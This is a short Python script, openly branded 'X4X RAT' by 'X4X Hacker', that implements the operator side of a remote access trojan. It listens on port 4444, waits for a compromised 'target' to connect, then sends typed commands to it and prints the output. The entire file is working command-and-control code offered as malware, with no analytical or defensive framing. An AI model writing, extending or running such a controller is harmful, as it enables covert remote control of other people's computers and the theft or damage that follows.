import socket
import sys

# X4X RAT - Developed By X4X Hacker
def x4x_controller():
    host = '0.0.0.0'
    port = 4444
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(5)
        print("\n[!] X4X RAT - Version 1.0")
        print("[!] Developed By X4X Hacker")
        print(f"[*] Waiting for incoming connections on port {port}...")
        
        client, addr = server.accept()
        print(f"[*] Target Connected: {addr[0]}")
        
        while True:
            cmd = input(f"X4X@{addr[0]}:~# ")
            if cmd == "": continue
            client.send(cmd.encode())
            
            if cmd == "exit":
                break
            
            # දත්ත ලබා ගැනීම (Large data support)
            response = client.recv(10240).decode()
            print(response)
            
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    x4x_controller()

